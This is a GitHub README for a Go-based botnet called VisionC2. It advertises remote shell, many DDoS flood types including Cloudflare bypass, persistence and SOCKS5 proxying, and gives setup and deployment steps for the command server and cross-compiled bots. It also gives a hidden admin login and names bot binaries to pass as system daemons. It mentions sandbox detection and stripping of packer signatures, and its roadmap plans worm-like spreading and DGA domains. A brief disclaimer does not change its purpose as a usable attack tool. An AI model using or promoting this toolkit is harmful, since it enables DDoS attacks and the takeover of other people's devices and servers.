
<div align="center">

# ☾℣☽ision - **Advanced Go-Based Botnet**

**DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture • TUI View**

![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)
![License](https://img.shields.io/badge/License-GNU%20GPLv3-yellow?style=for-the-badge)

</div>

![Animation](https://github.com/user-attachments/assets/4475a3a1-b3a5-4bb3-b00a-b30e88210dcd)

---

## 🤖 Features

| Command | Description |
|---------|-------------|
| `!shell`, `!exec` | Execute command with output |
| `!stream` | Real-time command streaming output |
| `!detach`, `!bg` | Run command in background |
| `!stop` | Stop all attacks |
| `!udpflood` | UDP flood attack |
| `!tcpflood` | TCP connection flood |
| `!http` | HTTP POST flood |
| `!https`, `!tls` | HTTPS/TLS flood |
| `!cfbypass` | Cloudflare bypass flood |
| `!syn` | Raw SYN flood |
| `!ack` | Raw ACK flood |
| `!gre` | GRE protocol flood |
| `!dns` | DNS Amp flood |
| `!persist` | Setup persistence |
| `!kill` | Terminate bot |
| `!info` | Get system info |
| `!socks` | Start SOCKS5 proxy |
| `!stopsocks` | Stop SOCKS5 proxy 

---

## 🚀 Quick Start

**Ubuntu/Debian:**
```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen build-essential
```

### **Step 1: Clone Repository**
```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
chmod +x *
```

### **Step 2: Run Interactive Setup**
```bash
python3 setup.py
```

The setup script will:
1. Generate 4096-bit TLS certificates
2. Create encryption keys and magic codes
3. Configure C2 address and ports
4. Cross-compile bot binaries for all architectures
5. Build the CNC server binary

**Output Locations:**
- CNC Server: `./server` (in VisionC2 root directory)
- Bot Binaries: `./VisionC2/bins/`
- Configuration: `setup_config.txt`


## 🖥️ Running the C2 Server

### **Option 1: TUI Mode (Recommended)**
```bash
# Start in screen session for persistence
screen ./server

# Detach from screen session: Ctrl+A, then D
# Reattach: screen -r 
```

### **Option 2: Telnet/Multi-User Mode**
```bash
# Start with split admin interface
screen ./server --split

# Connect to admin interface
nc your-server-ip 1337
# Login with "spamtec" to access hidden portal
```
> [COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  
---

## 📁 File Structure

```

VisionC2/
├── go.mod                  # Go module (Vision), Go 1.24
├── go.sum
├── setup.py                # Interactive setup wizard (Python 3)
├── server                  # Compiled CNC binary
├── bot/                    # Bot agent source
│   ├── main.go             # Entry point, config, shell exec, main loop
│   ├── connection.go       # TLS connection, DNS resolution, auth, C2 handler
│   ├── attacks.go          # L4/L7 DDoS attack methods + proxy support
│   ├── opsec.go            # Encryption, sandbox detection, bot ID generation
│   ├── persist.go          # Persistence mechanisms (cron, systemd, rc.local)
│   └── socks.go            # SOCKS5 proxy server implementation
├── cnc/                    # CNC server source
│   ├── main.go             # Server entry, TLS listener, user listener
│   ├── connection.go       # TLS config, bot auth handler, bot management
│   ├── cmd.go              # Command dispatch, user session handler, help menus
│   ├── ui.go               # Bubble Tea TUI (dashboard, bot list, attack builder)
│   ├── miscellaneous.go    # User auth, permissions (RBAC), utilities
│   ├── users.json          # User credential database
│   └── certificates/       # TLS certs (server.crt, server.key)
├── tools/
│   ├── build.sh            # Cross-compilation for 14 architectures
│   └── deUPX.py            # UPX signature stripper
├── bins/                   # Compiled bot binaries (output)
└── Docs/
    ├── ARCHITECTURE.md     # Technical overview
    ├── COMMANDS.md          # TUI hotkey reference
    ├── USAGE.md             # Usage guide
    ├── CHANGELOG.md         # Version history
    └── LICENSE
```
    
---
Bot binaries are automatically cross-compiled to `bot/bins/`.

---
## 🧬 Supported Architectures

| Binary Name | Architecture | Target Platforms | Size (approx) |
|-------------|--------------|------------------|---------------|
| `kworkerd0` | x86 (386)    | Linux 32-bit, legacy systems | 2.1 MB |
| `ethd0`     | x86_64       | Linux 64-bit (most servers) | 2.3 MB |
| `mdsync1`   | ARMv7        | Raspberry Pi 2/3, older ARM devices | 2.0 MB |
| `ip6addrd`  | ARM64        | Raspberry Pi 4, Android, AWS Graviton | 2.2 MB |
| `httpd`     | MIPS         | Routers, IoT devices | 2.4 MB |
| `+12 more`  | PPC64, RISC-V, s390x, loong64, etc. | Various embedded systems | 1.8-2.5 MB |
---
## 📜 Documentation

| File                    | Description                                      |
|-------------------------|--------------------------------------------------|
| [USAGE.md](Docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
| [COMMANDS.md](Docs/COMMANDS.md) | Complete CNC command reference              |
| [CHANGELOG.md](Docs/CHANGELOG.md) | Version history and breaking changes         |
| [ARCHITECTURE.md](Docs/ARCHITECTURE.md) | Detailed technical breakdown         |

## 🛣️ Roadmap

**In Progress**
- Finish TUI Updates
- Enhanced daemonization
- Competitor locker / killer module
  
**Planned**
- Auto-generated DGA fallback domains
- Self-replication & worm-like spreading
- Single-instance port takeover

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

This software is provided strictly for educational, research, and authorized penetration testing purposes. The authors are not responsible for any misuse or legal consequences resulting from its use.

## 📜 License
GNU General Public License v3.0 — see [LICENSE](LICENSE)

<div align="center"> <sub>Maintained with ❤️ by Syn</div> 
